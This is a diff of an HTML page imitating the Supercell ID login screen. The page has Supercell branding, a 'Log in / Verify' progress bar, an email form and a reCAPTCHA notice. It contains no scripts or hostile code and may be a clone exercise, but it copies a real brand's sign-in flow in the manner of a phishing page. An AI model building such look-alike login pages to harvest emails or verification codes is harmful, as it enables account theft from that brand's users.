@@ -1,20 +1,43 @@
 <!DOCTYPE html>
-<html lang=sl>
+<html lang="sl">
+
 <head>
- <link rel="stylesheet" href="style.css">
-<title>Supercell ID</title>
-<link rel="icon" type="image/x-icon" href="img/logo.png">
+	<link rel="stylesheet" href="style.css">
+	<title>Supercell ID</title>
+	<link rel="icon" type="image/x-icon" href="img/logo.png">
 </head>
+
 <body>
-	<div>
+
+	<div class="container">
+
 		<img src="img/text.png">
-			<div class="inside">
-			<h1>Log in to Supercell</h1>
-			<p>Enter your email and we'll send you a</p><p>verification code.</p>
+
+		<div class="progress">
+
+			<div class="texts">
+				<div>Log in</div>
+				<div>Verify</div>
 			</div>
-				<form action="/action_page.php">
-				<input type="text" name="fname" placeholder="Enter your Email"><br><br>
-				</form>
+
+			<div class="line">
+				<div class="circle"></div>
+			</div>
+
+		</div>
+
+		<div class="inside">
+			<h1>Log in to Supercell.com</h1>
+			<p>Enter your email and we'll send you a verification code.</p>
+		</div>
+
+		<form action="/action_page.php">
+			<input type="text" name="fname" placeholder="Enter your Email">
+			<br><br>
+		</form>
+		
+		<div class="txt">This site is protected by reCAPTCHA and the Google Privacy Policy and Terms of Service apply.</div>
 	</div>
+
 </body>
 </html>
